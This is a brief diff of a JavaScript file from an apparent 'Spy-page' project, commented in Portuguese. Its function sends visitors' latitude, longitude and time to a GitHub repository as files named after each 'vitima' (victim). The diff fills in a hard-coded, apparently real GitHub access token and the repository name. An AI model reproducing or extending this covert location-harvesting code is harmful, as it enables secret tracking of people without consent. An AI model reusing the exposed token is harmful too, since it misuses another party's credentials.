@@ -25,8 +25,8 @@ function showPosition(position) {
 
 // Função para enviar os dados para o GitHub
 function sendDataToGitHub(lat, lon, time) {
-    const token = 'SEU_TOKEN_AQUI'; // Coloque seu token de acesso pessoal aqui
-    const repo = 'SEU_REPOSITORIO'; // Nome do seu repositório GitHub
+    const token = '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'; // Coloque seu token de acesso pessoal aqui
+    const repo = 'Spy-page'; // Nome do seu repositório GitHub
     const path = `data/vitima_${Date.now()}.json`; // Nome do arquivo, pode ser personalizado
     const content = JSON.stringify({
         latitude: lat,
